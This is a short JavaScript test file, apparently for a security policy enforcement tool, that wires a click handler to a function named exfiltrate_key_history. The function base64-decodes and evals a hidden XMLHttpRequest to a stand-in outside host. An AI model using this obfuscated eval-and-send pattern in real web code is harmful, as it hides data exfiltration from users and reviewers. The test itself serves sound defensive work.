// exfil_test_b64_eval2.js
function exfiltrate_key_history() {
  1;
  JAM.call(eval, null, [window.atob("eG1saHR0cD1uZXcgWE1MSHR0cFJlcXVlc3QoKTsKeG1saHR0cC5vcGVuKCJHRVQiLCAiaHR0cDovL0FuYWx5dGljc0luYzo4MDAwL3N1Ym1pc3Npb24uaHRtbD90ZXN0PWVuY29kZV9ldmFsMiIsIHRydWUpOwp4bWxodHRwLnNlbmQobnVsbCk7")]);
  return
}
JAM.set(document.getElementById("test"), "onclick", exfiltrate_key_history)
